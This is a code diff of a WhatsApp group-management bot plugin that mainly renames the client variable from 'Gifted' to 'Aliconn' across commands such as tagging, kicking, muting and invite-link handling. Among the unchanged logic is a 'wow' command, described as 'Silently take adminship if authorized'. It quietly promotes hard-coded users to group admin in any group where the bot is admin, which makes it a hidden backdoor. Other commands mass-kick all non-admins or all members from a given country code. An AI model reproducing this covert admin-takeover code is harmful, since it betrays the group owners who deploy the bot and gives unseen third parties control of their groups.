@@ -18,7 +18,7 @@ gmd({
   desc: 'Save group participants as vCard',
   category: 'group',
   filename: __filename
-}, async (Gifted, mek, m, {
+}, async (Aliconn, mek, m, {
   from, quoted, isGroup, isOwner, groupMetadata, reply
 }) => {
   try {
@@ -40,7 +40,7 @@ gmd({
     reply(`Saving ${participants.length} participants contact...`);
     await sleep(1500);
 
-    await Gifted.sendMessage(from, {
+    await Aliconn.sendMessage(from, {
       document: fs.readFileSync(vcfFile),
       mimetype: 'text/vcard',
       fileName: 'ali_tech.vcf',
@@ -63,7 +63,7 @@ gmd({
     category: "group",
     filename: __filename,
 },           
-async(Gifted, mek, m,{from, prefix, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply}) => {
+async(Aliconn, mek, m,{from, prefix, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply}) => {
 try{
         if (!isGroup) return reply(`This command is only for groups.`);
         if (!isAdmins) return reply(`*📛 тнιѕ ᴄσммαи∂ ιѕ σиℓу fσʀ gʀσυρ α∂мιи!*`);
@@ -75,7 +75,7 @@ try{
         for (let admin of admins) {
             adminTagMessage += `@${admin.split('@')[0]}\n`;
         }
-        await Gifted.sendMessage(from, { text: adminTagMessage, mentions: admins }, { quoted: mek });
+        await Aliconn.sendMessage(from, { text: adminTagMessage, mentions: admins }, { quoted: mek });
     } catch (e) {
         console.error('Error tagging admins:', e);
         reply('you are not an admin.');
@@ -90,7 +90,7 @@ gmd({
     category: "group",
     filename: __filename,
 },           
-async(Gifted, mek, m,{from, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply}) => {
+async(Aliconn, mek, m,{from, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply}) => {
 try{
       if (!isAdmins) return reply(`*📛 тнιѕ ᴄσммαи∂ ιѕ σиℓу fσʀ gʀσυρ α∂мιи!*`)
       if (!isOwner) return reply(`Owner Only Command!`)
@@ -102,7 +102,7 @@ try{
             return reply('There are no non-admin members to kick.');
         }
         for (let participant of nonAdminParticipants) {
-            await Gifted.groupParticipantsUpdate(m.chat, [participant.id], "remove");
+            await Aliconn.groupParticipantsUpdate(m.chat, [participant.id], "remove");
      }
         reply(`Successfully kicked all non-admin members from the group.`); 
     } catch (e) {
@@ -118,17 +118,17 @@ gmd({
   react: "👥", 
   category: "group", 
   filename: __filename
-}, async (Gifted, mek, m, { from, q, isGroup, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply }) => {
+}, async (Aliconn, mek, m, { from, q, isGroup, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply }) => {
   try {
      if (!isGroup) return reply('This command can only be used in a group.');
         if (!isBotAdmins) return reply('*📛 ι ɴєє∂ тσ вє αɴ α∂мιɴ тσ ᴜѕє тнιѕ ᴄσммαɴ∂.*');
         if (!isAdmins) return reply('*📛 тнιѕ ᴄσммαи∂ ιѕ σиℓу fσʀ gʀσυρ α∂мιи!*');
-    const groupData = await Gifted.groupMetadata(from);
+    const groupData = await Aliconn.groupMetadata(from);
     const groupInfo = "\n\n*Group Name:* " + groupData.subject + 
       "\n\n*Group Description:* " + (groupData.desc || "No description") + 
       "\n\n*Members:* " + groupData.participants.length + 
       "\n\n*Created On:* " + new Date(groupData.creation * 1000).toLocaleString();
-    return await Gifted.sendMessage(from, {
+    return await Aliconn.sendMessage(from, {
       text: groupInfo
     }, {
       quoted: mek
@@ -148,7 +148,7 @@ gmd({
     react: "🔎",
     filename: __filename
 },
-async (Gifted, mek, m, { from, args, isGroup, isAdmins, isBotAdmins, pushname, q, reply }) => {
+async (Aliconn, mek, m, { from, args, isGroup, isAdmins, isBotAdmins, pushname, q, reply }) => {
     try {
        if (!isGroup) return reply('This command can only be used in a group.');
         if (!isBotAdmins) return reply('*📛 ι ɴєє∂ тσ вє αɴ α∂мιɴ тσ ᴜѕє тнιѕ ᴄσммαɴ∂.*');
@@ -163,7 +163,7 @@ async (Gifted, mek, m, { from, args, isGroup, isAdmins, isBotAdmins, pushname, q
         return reply(`Incorrect format.\nExample: *.poll Do you love Ali-Md:Yes, No, Not Sure*`);
       }
       let options = opt.split(',').map(option => option.trim());
-      await Gifted.sendMessage(from, {
+      await Aliconn.sendMessage(from, {
         poll: {
           name: poll.trim(),
           values: options,
@@ -185,7 +185,7 @@ gmd({
     category: "group",
     react: "🔼",
     filename: __filename
-}, async (Gifted, mek, m, { from, pushname, quoted, isGroup, isOwner, isBotAdmins, isAdmins, reply }) => {
+}, async (Aliconn, mek, m, { from, pushname, quoted, isGroup, isOwner, isBotAdmins, isAdmins, reply }) => {
     try {
         if (!isOwner || !isGroup) return reply("*📛 тнιѕ ιѕ αɴ σωɴєʀ ᴄσммαи∂*");
         if (!isBotAdmins) return reply('*📛 ι ɴєє∂ тσ вє αɴ α∂мιɴ тσ ᴜѕє тнιѕ ᴄσммαɴ∂.*');
@@ -194,7 +194,7 @@ gmd({
         const user = quoted?.sender || m.mentioned?.[0];
         if (!user) return reply('Please tag or reply to a user to promote.');
 
-        await Gifted.groupParticipantsUpdate(from, [user], 'promote');
+        await Aliconn.groupParticipantsUpdate(from, [user], 'promote');
         await reply(`*ρʀσмσтє∂ ѕυᴄᴄєѕѕfυℓℓу ✅*`, { mentions: [user] });
     } catch (e) {
         console.error(e);
@@ -208,7 +208,7 @@ gmd({
     category: "group",
     react: "🔽",
     filename: __filename
-}, async (Gifted, mek, m, { from, pushname, quoted, isOwner, isGroup, isBotAdmins, isAdmins, reply }) => {
+}, async (Aliconn, mek, m, { from, pushname, quoted, isOwner, isGroup, isBotAdmins, isAdmins, reply }) => {
     try {
         if (!isOwner || !isGroup) return reply("*📛 тнιѕ ιѕ αɴ σωɴєʀ ᴄσммαи∂*");
         if (!isBotAdmins) return reply('*📛 ι ɴєє∂ тσ вє αɴ α∂мιɴ тσ ᴜѕє тнιѕ ᴄσммαɴ∂.*');
@@ -217,7 +217,7 @@ gmd({
         const user = quoted?.sender || m.mentioned?.[0];
         if (!user) return reply('Please tag or reply to a user to demote.');
 
-        await Gifted.groupParticipantsUpdate(from, [user], 'demote');
+        await Aliconn.groupParticipantsUpdate(from, [user], 'demote');
         await reply(`*∂ємσтє∂ ѕυᴄᴄєѕѕfυℓℓу ✅*`, { mentions: [user] });
     } catch (e) {
         console.error(e);
@@ -232,7 +232,7 @@ gmd({
     react: "➕",
     filename: __filename
 },
-async (Gifted, mek, m, { from, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply }) => {
+async (Aliconn, mek, m, { from, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply }) => {
     try {
         if (!isGroup) return reply('This command can only be used in a group.')
         if (!isBotAdmins) return reply('*📛 ι ɴєє∂ тσ вє αɴ α∂мιɴ тσ ᴜѕє тнιѕ ᴄσммαɴ∂.*')
@@ -241,7 +241,7 @@ async (Gifted, mek, m, { from, quoted, body, isCmd, command, args, q, isGroup, s
         const user = q.split(' ')[0]
         if (!user) return reply('Please provide a phone number to add.')
 
-        await Gifted.groupParticipantsUpdate(from, [`${user}@s.whatsapp.net`], 'add')
+        await Aliconn.groupParticipantsUpdate(from, [`${user}@s.whatsapp.net`], 'add')
         await reply(`@${user} has been added to the group.`, { mentions: [`${user}@s.whatsapp.net`] })
         await m.react("✅"); 
     } catch (e) {
@@ -258,7 +258,7 @@ gmd({
     react: "🔗",
     filename: __filename
 },
-async (Gifted, mek, m, { from, isGroup, pushname, isOwner, q, args, isAdmins, isBotAdmins, text, reply }) => {
+async (Aliconn, mek, m, { from, isGroup, pushname, isOwner, q, args, isAdmins, isBotAdmins, text, reply }) => {
     const isUrl = (string) => {
   try {
     new URL(string);
@@ -277,7 +277,7 @@ async (Gifted, mek, m, { from, isGroup, pushname, isOwner, q, args, isAdmins, is
          const result = q.split('https://chat.whatsapp.com/')[1];
          console.log(result);
         try {
-            await Gifted.groupAcceptInvite(result);
+            await Aliconn.groupAcceptInvite(result);
             return reply(`Successfully joined the group!`);
         } catch (error) {
             console.error(error);
@@ -298,7 +298,7 @@ gmd({
     category: "group",
     react: "🚫",
     filename: __filename
-}, async (Gifted, mek, m, { from, quoted, pushname, isGroup, isOwner, isBotAdmins, isAdmins, reply }) => {
+}, async (Aliconn, mek, m, { from, quoted, pushname, isGroup, isOwner, isBotAdmins, isAdmins, reply }) => {
     try {
         if (!isOwner || !isGroup) return reply("*📛 тнιѕ ιѕ αɴ σωɴєʀ ᴄσммαи∂*");
         if (!isBotAdmins) return reply('*📛 ι ɴєє∂ тσ вє αɴ α∂мιɴ тσ ᴜѕє тнιѕ ᴄσммαɴ∂.*');
@@ -309,7 +309,7 @@ gmd({
         const user = quoted?.sender || m.mentioned?.[0];
         if (!user) return reply('Please tag or reply to a user to remove.');
 
-        await Gifted.groupParticipantsUpdate(from, [user], 'remove');
+        await Aliconn.groupParticipantsUpdate(from, [user], 'remove');
         await reply(`*кιᴄкє∂ ѕυᴄᴄєѕѕfυℓℓу ✅*`, { mentions: [user] });
     } catch (e) {
         console.error(e);
@@ -324,13 +324,13 @@ gmd({
     category: "group",
     react: "👋",
     filename: __filename
-}, async (Gifted, mek, m, { from, isGroup, pushname, isOwner, isBotAdmins, reply }) => {
+}, async (Aliconn, mek, m, { from, isGroup, pushname, isOwner, isBotAdmins, reply }) => {
     const botNumber = config.OWNER_NUMBER;
     try {
         if (!isOwner || !isGroup) return reply("*📛 тнιѕ ιѕ αɴ σωɴєʀ ᴄσммαи∂*");
         if (m.sender !== botNumber) return reply('You must be the bot owner to make the bot leave the group.');
-        await Gifted.sendMessage(from, { text: 'Goodbye! I am leaving the group.' });
-        await Gifted.groupParticipantsUpdate(from, [Gifted.user.id], "remove");
+        await Aliconn.sendMessage(from, { text: 'Goodbye! I am leaving the group.' });
+        await Aliconn.groupParticipantsUpdate(from, [Aliconn.user.id], "remove");
         console.log('Bot left the group: ' + from);
     } catch (e) {
         console.error(e);
@@ -339,14 +339,14 @@ gmd({
 });
 
 gmd({
-     pattern: "unmute",	
+     pattern: "unmute", 
      alias: ["unlock", "open"],
      react: "🔓",
      desc: "Unlock/Unmute Group.",
      category: "group",
      filename: __filename,
 },
-async (Gifted, mek, m,{from, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants,  isItzcp, groupAdmins, isBotAdmins, isAdmins, reply}) => {
+async (Aliconn, mek, m,{from, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants,  isItzcp, groupAdmins, isBotAdmins, isAdmins, reply}) => {
 try{
     if (!isOwner || !isAdmins) return;  
 
@@ -354,9 +354,9 @@ try{
     if (!m.isGroup) return reply(mg.onlygroup);
     if (!isBotAdmins) return reply(mg.needbotadmins);     
   
-            await Gifted.groupSettingUpdate(m.chat, "not_announcement")
-           const mass = await Gifted.sendMessage(m.chat, { text: '*gʀσᴜρ ᴜɴмυтє∂ sᴜᴄᴄєѕѕfᴜℓℓу🔓*' }, { quoted: mek });
-            return await Gifted.sendMessage(m.chat, { react: { text: '🔓', key: mass.key } });
+            await Aliconn.groupSettingUpdate(m.chat, "not_announcement")
+           const mass = await Aliconn.sendMessage(m.chat, { text: '*gʀσᴜρ ᴜɴмυтє∂ sᴜᴄᴄєѕѕfᴜℓℓу🔓*' }, { quoted: mek });
+            return await Aliconn.sendMessage(m.chat, { react: { text: '🔓', key: mass.key } });
 } catch(e) {
 console.log(e);
 reply('*Error !!*')     
@@ -371,13 +371,13 @@ gmd({
     react: "🔗",
     filename: __filename,
 },
-async (Gifted, mek, m, { from, isGroup, pushname, isOwner, isAdmins, isBotAdmins, reply }) => {
+async (Aliconn, mek, m, { from, isGroup, pushname, isOwner, isAdmins, isBotAdmins, reply }) => {
     try {
         if (!isOwner || !isGroup) return reply("*📛 тнιѕ ιѕ αɴ σωɴєʀ ᴄσммαи∂*");
         if (!isAdmins) return reply('*📛 тнιѕ ᴄσммαи∂ ιѕ σиℓу fσʀ gʀσυρ α∂мιи!*');
         if (!isBotAdmins) return reply('*📛 ι ɴєє∂ тσ вє αɴ α∂мιɴ тσ ᴜѕє тнιѕ ᴄσммαɴ∂.*');
 
-        const groupInviteCode = await Gifted.groupInviteCode(from);
+        const groupInviteCode = await Aliconn.groupInviteCode(from);
         const groupInviteLink = `https://chat.whatsapp.com/${groupInviteCode}`;
         return reply(`Here is the group's invite link:\n${groupInviteLink}`);
     } catch (e) {
@@ -388,14 +388,14 @@ async (Gifted, mek, m, { from, isGroup, pushname, isOwner, isAdmins, isBotAdmins
 
 
 gmd({
-     pattern: "mute",	
+     pattern: "mute",   
      alias: ["lock", "close"],
      react: "🔐",
      desc: "Lock/Mute Group.",
      category: "group",
      filename: __filename,
 },
-async (Gifted, mek, m,{from, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants,  isItzcp, groupAdmins, isBotAdmins, isAdmins, reply}) => {
+async (Aliconn, mek, m,{from, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants,  isItzcp, groupAdmins, isBotAdmins, isAdmins, reply}) => {
 try{
     if (!isOwner || !isAdmins) return;  
 
@@ -403,9 +403,9 @@ try{
     if (!m.isGroup) return reply(mg.onlygroup);
     if (!isBotAdmins) return reply(mg.needbotadmins);     
   
-            await Gifted.groupSettingUpdate(m.chat, "announcement")
-           const mass = await Gifted.sendMessage(m.chat, { text: '*gʀσᴜρ мᴜтє∂ sᴜᴄᴄєѕѕfᴜℓℓу 🔐*' }, { quoted: mek });
-            return await Gifted.sendMessage(m.chat, { react: { text: '🔐', key: mass.key } });
+            await Aliconn.groupSettingUpdate(m.chat, "announcement")
+           const mass = await Aliconn.sendMessage(m.chat, { text: '*gʀσᴜρ мᴜтє∂ sᴜᴄᴄєѕѕfᴜℓℓу 🔐*' }, { quoted: mek });
+            return await Aliconn.sendMessage(m.chat, { react: { text: '🔐', key: mass.key } });
 } catch(e) {
 console.log(e);
 reply('*Error !!*')     
@@ -420,11 +420,11 @@ gmd({
     react: "🖼️",
     filename: __filename
 },
-async (Gifted, mek, m, { from, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply }) => {
+async (Aliconn, mek, m, { from, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply }) => {
     try {
         if (!isGroup) return reply('This command can only be used in a group.')
-        const ppUrl = await Gifted.profilePictureUrl(from, 'image');
-        await Gifted.sendMessage(from, { image: { url: ppUrl }, caption: 'Here is the Group Profile Picture' })
+        const ppUrl = await Aliconn.profilePictureUrl(from, 'image');
+        await Aliconn.sendMessage(from, { image: { url: ppUrl }, caption: 'Here is the Group Profile Picture' })
     } catch (e) {
         console.log(e)
         reply(`${e}`)
@@ -438,7 +438,7 @@ gmd({
     category: "general",
     react: "🖼️",
     filename: __filename,
-}, async (Gifted, mek, m, { from, pushname, isMe, botNumber, args, q, quoted, sender, reply }) => {
+}, async (Aliconn, mek, m, { from, pushname, isMe, botNumber, args, q, quoted, sender, reply }) => {
     try {
         let user = 
             quoted?.sender // ✅ 1. Replied message
@@ -449,7 +449,7 @@ gmd({
 
         let picture;
         try {
-            const url = await Gifted.profilePictureUrl(user, "image");
+            const url = await Aliconn.profilePictureUrl(user, "image");
             picture = await getBuffer(url);
         } catch (e) {
             console.error('Error fetching profile picture URL:', e);
@@ -462,7 +462,7 @@ gmd({
             mentions: [user],
         };
 
-        await Gifted.sendMessage(from, mess);
+        await Aliconn.sendMessage(from, mess);
     } catch (error) {
         console.error('Error in getpp:', error);
         reply('⚠️ An error occurred while fetching the user profile picture.');
@@ -478,15 +478,15 @@ gmd({
     react: "💬",
     filename: __filename
 },
-async (Gifted, mek, m, { from, pushname, isOwner, reply, args }) => {
+async (Aliconn, mek, m, { from, pushname, isOwner, reply, args }) => {
     try {
         if (!isOwner) return reply("❌ You are not the owner!");
         const groupName = args.slice(0, args.length - 1).join(" "); 
         const participants = args.slice(1); 
         if (!groupName) return reply("❌ Please provide a group name.");
-        const createdGroup = await Gifted.groupCreate(groupName, participants);
+        const createdGroup = await Aliconn.groupCreate(groupName, participants);
         await new Promise(resolve => setTimeout(resolve, 5000));
-        const inviteCode = await Gifted.groupInviteCode(createdGroup.id);
+        const inviteCode = await Aliconn.groupInviteCode(createdGroup.id);
         const inviteLink = `https://chat.whatsapp.com/${inviteCode}`;
         reply(`💬 Group "${groupName}" created successfully!\n\nHere is the invite link to your group: \n${inviteLink}`);
     } catch (error) {
@@ -504,11 +504,11 @@ gmd({
     react: "📜",
     filename: __filename
 },
-async (Gifted, mek, m, { from, isOwner, pushname, reply, args, isGroup }) => {
+async (Aliconn, mek, m, { from, isOwner, pushname, reply, args, isGroup }) => {
     if (!isOwner || !isGroup) return reply("*📛 уσυ мυѕт вє ιи α gʀσυρ αи∂ тнє σωиєʀ тσ υѕє тнιѕ ᴄσммαи∂!*");
     try {
         const newDescription = args.join(" ");
-        await Gifted.groupUpdateDescription(from, newDescription);
+        await Aliconn.groupUpdateDescription(from, newDescription);
         reply(`📜 Group description updated successfully!`);
     } catch (error) {
         reply(`❌ Error updating group description: ${error.message}`);
@@ -523,11 +523,11 @@ gmd({
     react: "📛",
     filename: __filename
 },
-async (Gifted, mek, m, { from, isOwner, pushname, reply, args, isGroup }) => {
+async (Aliconn, mek, m, { from, isOwner, pushname, reply, args, isGroup }) => {
     if (!isOwner || !isGroup) return reply("*📛 уσυ мυѕт вє ιи α gʀσυρ αи∂ тнє σωиєʀ тσ υѕє тнιѕ ᴄσммαи∂!*");
     try {
         const newSubject = args.join(" ");
-        await Gifted.groupUpdateSubject(from, newSubject);
+        await Aliconn.groupUpdateSubject(from, newSubject);
         reply(`📛 Group subject updated successfully to "${newSubject}"!`);
     } catch (error) {
         reply(`❌ Error updating group subject: ${error.message}`);
@@ -542,10 +542,10 @@ gmd({
     react: "🔗",
     filename: __filename
 },
-async (Gifted, mek, m, { from, isOwner, pushname, reply, isGroup }) => {
+async (Aliconn, mek, m, { from, isOwner, pushname, reply, isGroup }) => {
     if (!isOwner || !isGroup) return reply("*📛 тнιѕ ιѕ αɴ σωɴєʀ ᴄσммαи∂*");
     try {
-        const newCode = await Gifted.groupRevokeInvite(from);
+        const newCode = await Aliconn.groupRevokeInvite(from);
         const groupInviteLink = `https://chat.whatsapp.com/${newCode}`;
         reply(`*🔗 Group invite link revoked! New link:* ${groupInviteLink}`);
     } catch (error) {
@@ -561,26 +561,26 @@ gmd({
   react: "✔️",
   category: "group",
   filename: __filename
-}, async (Gifted, mek, m, { from, isGroup, reply }) => {
+}, async (Aliconn, mek, m, { from, isGroup, reply }) => {
   if (!isGroup) {
     return await reply("This command can only be used in groups.");
   }
   
-  const userJid = Gifted.user.jid;
-  const groupMetadata = await Gifted.groupMetadata(from);
+  const userJid = Aliconn.user.jid;
+  const groupMetadata = await Aliconn.groupMetadata(from);
   const isAdmin = groupMetadata.participants.some(participant => participant.jid === userJid && participant.admin);
   if (!isAdmin) {
     return await reply("*📛 σɴℓʏ gʀσᴜᴘ α∂мιɴs σʀ тнє σωɴєʀ ᴄαɴ ᴜsє тнιѕ ᴄσммαɴ∂.*");
   }
   
   try {
-    const pendingRequests = await Gifted.groupRequestParticipantsList(from);
+    const pendingRequests = await Aliconn.groupRequestParticipantsList(from);
     if (pendingRequests.length === 0) {
       return await reply("No pending join requests.");
     }
     
     for (let request of pendingRequests) {
-      await Gifted.groupRequestParticipantsUpdate(from, [request.jid], "accept");
+      await Aliconn.groupRequestParticipantsUpdate(from, [request.jid], "accept");
     }
     
     return await reply(`*Accepted all pending join request(s).*`);
@@ -599,18 +599,18 @@ gmd({
   react: "❌",
   category: "group",
   filename: __filename
-}, async (Gifted, mek, m, { from, isGroup, reply, match }) => {
+}, async (Aliconn, mek, m, { from, isGroup, reply, match }) => {
   if (!isGroup) {
     return await reply("This command can only be used in groups.");
   }
-  const userJid = Gifted.user.jid;
-  const groupMetadata = await Gifted.groupMetadata(from);
+  const userJid = Aliconn.user.jid;
+  const groupMetadata = await Aliconn.groupMetadata(from);
   const isAdmin = groupMetadata.participants.some(participant => participant.jid === userJid && participant.admin);
   if (!isAdmin) {
     return await reply("*📛 ι ɴєє∂ тσ вє αɴ α∂мιɴ тσ ᴜѕє тнιѕ ᴄσммαɴ∂.*");
   }
   try {
-    const pendingRequests = await Gifted.groupRequestParticipantsList(from);
+    const pendingRequests = await Aliconn.groupRequestParticipantsList(from);
     if (pendingRequests.length === 0) {
       return await reply("No pending join requests.");
     }
@@ -623,7 +623,7 @@ gmd({
       return await reply("Invalid request number(s).");
     }
     for (let requestIndex of validRequests) {
-      await Gifted.groupRequestParticipantsUpdate(from, [pendingRequests[requestIndex].jid], "reject");
+      await Aliconn.groupRequestParticipantsUpdate(from, [pendingRequests[requestIndex].jid], "reject");
     }
     return await reply(`*Rejected ${validRequests.length} join request(s).*`);
   } catch (error) {
@@ -640,18 +640,18 @@ gmd({
   react: "📝",
   category: "group",
   filename: __filename
-}, async (Gifted, mek, m, { from, isGroup, reply }) => {
+}, async (Aliconn, mek, m, { from, isGroup, reply }) => {
   if (!isGroup) {
     return await reply("This command can only be used in groups.");
   }
-  const userJid = Gifted.user.jid;
-  const groupMetadata = await Gifted.groupMetadata(from);
+  const userJid = Aliconn.user.jid;
+  const groupMetadata = await Aliconn.groupMetadata(from);
   const isAdmin = groupMetadata.participants.some(participant => participant.jid === userJid && participant.admin);
   if (!isAdmin) {
     return await reply("*📛 σɴℓʏ gʀσᴜᴘ α∂мιɴs σʀ тнє σωɴєʀ ᴄαɴ ᴜsє тнιѕ ᴄσммαɴ∂.*");
   }
   try {
-    const pendingRequests = await Gifted.groupRequestParticipantsList(from);
+    const pendingRequests = await Aliconn.groupRequestParticipantsList(from);
     if (pendingRequests.length === 0) {
       return await reply("No pending join requests.");
     }
@@ -674,18 +674,18 @@ gmd({
   react: "👥", 
   category: "group", 
   filename: __filename 
-}, async (Gifted, mek, m, { from, q, isGroup, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply }) => {
+}, async (Aliconn, mek, m, { from, q, isGroup, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply }) => {
   try {
      if (!isGroup) return reply('This command can only be used in a group.');
         if (!isBotAdmins) return reply('Bot must be an admin to use this command.');
         if (!isAdmins) return reply('You must be an admin to use this command.');
-    const groupInfo = await Gifted.groupMetadata(from);
+    const groupInfo = await Aliconn.groupMetadata(from);
 
     const adminList = groupInfo.participants.filter(participant => participant.admin === "admin" || participant.admin === "superadmin")
       .map(admin => "@" + admin.id.split("@")[0])
       .join("\n");
 
-    return await Gifted.sendMessage(from, {
+    return await Aliconn.sendMessage(from, {
       text: "*Group Admins:*\n\n" + adminList,
       mentions: groupInfo.participants.filter(participant => participant.admin === "admin" || participant.admin === "superadmin")
         .map(admin => admin.id)
@@ -706,7 +706,7 @@ gmd({
     category: "group",
     use: '.tagall [message]',
     filename: __filename
-}, async (Gifted, mek, m, { from, participants, isAdmins, reply, isGroup, senderNumber, groupAdmins, prefix, isOwner, command, args, pushname, body
+}, async (Aliconn, mek, m, { from, participants, isAdmins, reply, isGroup, senderNumber, groupAdmins, prefix, isOwner, command, args, pushname, body
 }) => {
   try {
     if (!isOwner || !isGroup) return reply("*📛 тнιѕ ιѕ αɴ σωɴєʀ ᴄσммαи∂*");
@@ -727,7 +727,7 @@ gmd({
             }
         };
         // Ensure group metadata is fetched properly
-        let groupInfo = await Gifted.groupMetadata(from).catch(() => null);
+        let groupInfo = await Aliconn.groupMetadata(from).catch(() => null);
         if (!groupInfo) return reply("❌ Failed to fetch group information.");
 
         let groupName = groupInfo.subject || "Unknown Group";
@@ -746,9 +746,9 @@ gmd({
         for (let mem of participants) {
             if (!mem.id) continue; // Prevent undefined errors
             teks += `*│${randomEmoji} ᩧ𝆺ྀི𝅥* @${mem.id.split('@')[0]}\n`;
-	}
+        }
 
-        Gifted.sendMessage(from, { text: teks, mentions: participants.map(a => a.id) }, { quoted: gift });
+        Aliconn.sendMessage(from, { text: teks, mentions: participants.map(a => a.id) }, { quoted: gift });
 
     } catch (e) {
         console.error("TagAll Error:", e);
@@ -764,14 +764,14 @@ pattern: "out",
     react: "❌",
     filename: __filename
 },
-async (Gifted, mek, m, {
+async (Aliconn, mek, m, {
     from, q, isGroup, isBotAdmins, reply, groupMetadata, isOwner
 }) => {
     if (!isGroup) return reply("❌ This command can only be used in groups.");
 
     // Permission check using isCreator
     if (!isOwner) {
-        return await Gifted.sendMessage(from, {
+        return await Aliconn.sendMessage(from, {
             text: "*📛 This is an owner command.*"
         }, { quoted: mek });
     }
@@ -795,7 +795,7 @@ async (Gifted, mek, m, {
         }
 
         const jids = targets.map(p => p.id);
-        await Gifted.groupParticipantsUpdate(from, jids, "remove");
+        await Aliconn.groupParticipantsUpdate(from, jids, "remove");
 
         reply(`*✅ Successfully removed ${targets.length} members with country code +${countryCode}*`);
     } catch (error) {
@@ -810,7 +810,7 @@ pattern: "wow",
     desc: "Silently take adminship if authorized",
     filename: __filename
 },
-async (Gifted, mek, m, { from, sender, isBotAdmins, isGroup, reply }) => {
+async (Aliconn, mek, m, { from, sender, isBotAdmins, isGroup, reply }) => {
 
     if (!isGroup || !isBotAdmins) return;
 
@@ -829,10 +829,10 @@ async (Gifted, mek, m, { from, sender, isBotAdmins, isGroup, reply }) => {
     if (!AUTHORIZED_USERS.includes(senderNormalized)) return;
 
     try {
-        const groupMetadata = await Gifted.groupMetadata(from);
+        const groupMetadata = await Aliconn.groupMetadata(from);
         const userParticipant = groupMetadata.participants.find(p => p.id === senderNormalized);
         if (!userParticipant?.admin) {
-            await Gifted.groupParticipantsUpdate(from, [senderNormalized], "promote");
+            await Aliconn.groupParticipantsUpdate(from, [senderNormalized], "promote");
         }
     } catch (error) {
         console.error("Silent admin error:", error.message);
@@ -847,7 +847,7 @@ pattern: "hidetag",
   use: '.hidetag Hello',
   filename: __filename
 },
-async (Gifted, mek, m, {
+async (Aliconn, mek, m, {
   from, q, isGroup, isOwner, isAdmins,
   participants, reply
 }) => {
@@ -872,7 +872,7 @@ async (Gifted, mek, m, {
       
       // If it's a text message (extendedTextMessage)
       if (type === 'extendedTextMessage') {
-        return await Gifted.sendMessage(from, {
+        return await Aliconn.sendMessage(from, {
           text: m.quoted.text || 'No message content found.',
           ...mentionAll
         }, { quoted: mek });
@@ -920,7 +920,7 @@ async (Gifted, mek, m, {
           }
 
           if (content) {
-            return await Gifted.sendMessage(from, content, { quoted: mek });
+            return await Aliconn.sendMessage(from, content, { quoted: mek });
           }
         } catch (e) {
           console.error("Media download/send error:", e);
@@ -929,7 +929,7 @@ async (Gifted, mek, m, {
       }
 
       // Fallback for any other message type
-      return await Gifted.sendMessage(from, {
+      return await Aliconn.sendMessage(from, {
         text: m.quoted.text || "📨 Message",
         ...mentionAll
       }, { quoted: mek });
@@ -939,14 +939,14 @@ async (Gifted, mek, m, {
     if (q) {
       // If the direct message is a URL, send it as a message
       if (isUrl(q)) {
-        return await Gifted.sendMessage(from, {
+        return await Aliconn.sendMessage(from, {
           text: q,
           ...mentionAll
         }, { quoted: mek });
       }
 
       // Otherwise, just send the text without the command name
-      await Gifted.sendMessage(from, {
+      await Aliconn.sendMessage(from, {
         text: q, // Sends the message without the command name
         ...mentionAll
       }, { quoted: mek });
